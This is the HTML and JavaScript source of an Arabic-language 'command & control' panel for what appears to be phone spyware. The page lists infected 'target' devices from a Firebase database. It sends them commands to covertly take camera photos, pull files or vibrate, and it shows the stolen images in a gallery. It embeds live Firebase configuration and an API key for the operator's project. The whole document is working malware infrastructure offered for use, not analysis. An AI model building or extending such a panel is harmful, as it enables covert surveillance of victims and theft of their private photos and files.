<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>THE DOCTOR | COMMAND & CONTROL</title>
    <style>
        :root { --gold: #d4af37; --glow: #00ff41; --bg: #050505; }
        body { background: var(--bg); color: var(--glow); font-family: 'Courier New', monospace; }
        .grid { display: grid; grid-template-columns: 300px 1fr; height: 100vh; }
        .sidebar { border-left: 2px solid var(--gold); padding: 15px; background: #0a0a0a; }
        .main { padding: 20px; overflow-y: auto; }
        .target-card { border: 1px solid #333; padding: 10px; margin-bottom: 10px; cursor: pointer; transition: 0.3s; }
        .target-card:hover { border-color: var(--gold); box-shadow: 0 0 10px var(--gold); }
        .active { color: var(--gold); font-weight: bold; }
        .image-gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
        img { width: 100%; border: 1px solid #444; }
        .cmd-btn { background: transparent; border: 1px solid var(--glow); color: var(--glow); padding: 5px; width: 100%; margin-top: 5px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="grid">
        <div class="sidebar">
            <h3>الأجهزة النشطة</h3>
            <div id="target-list">جاري المزامنة...</div>
        </div>
        <div class="main">
            <h2 id="current-target">اختر وحدة تنفيذية للبدء</h2>
            <div id="controls" style="display:none;">
                <button class="cmd-btn" onclick="sendCommand('capture_photo')">التقاط صورة</button>
                <button class="cmd-btn" onclick="sendCommand('get_files')">سحب الملفات</button>
                <button class="cmd-btn" onclick="sendCommand('vibrate')">تفعيل الهز (Vibration)</button>
                <hr>
                <h4>الصور المستلمة:</h4>
                <div id="gallery" class="image-gallery"></div>
            </div>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyDqZlMnIIXpos70i0vx2jwL_SVG68tcr04",
            authDomain: "hkrs5000.firebaseapp.com",
            databaseURL: "https://hkrs5000-default-rtdb.firebaseio.com",
            projectId: "hkrs5000",
            storageBucket: "hkrs5000.firebasestorage.app",
            messagingSenderId: "273977078526",
            appId: "1:273977078526:web:da9e512c2421c300352baf"
        };
        
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();
        let selectedId = null;

        // مزامنة قائمة الأهداف
        db.ref('devices').on('value', snapshot => {
            const list = document.getElementById('target-list');
            list.innerHTML = "";
            snapshot.forEach(child => {
                const device = child.val();
                const div = document.createElement('div');
                div.className = "target-card";
                div.innerHTML = `ID: ${child.key} <br> <span class="active">نشط</span>`;
                div.onclick = () => selectDevice(child.key);
                list.appendChild(div);
            });
        });

        function selectDevice(id) {
            selectedId = id;
            document.getElementById('current-target').innerText = "التحكم في: " + id;
            document.getElementById('controls').style.display = "block";
            loadImages(id);
        }

        function sendCommand(cmd) {
            if(!selectedId) return;
            db.ref(`commands/${selectedId}`).set({ action: cmd, timestamp: Date.now() });
            alert("تم إرسال الأمر: " + cmd);
        }

        function loadImages(id) {
            db.ref(`data/${id}/images`).on('value', snapshot => {
                const gallery = document.getElementById('gallery');
                gallery.innerHTML = "";
                snapshot.forEach(child => {
                    const img = document.createElement('img');
                    img.src = child.val().url;
                    gallery.appendChild(img);
                });
            });
        }
    </script>
</body>
</html>
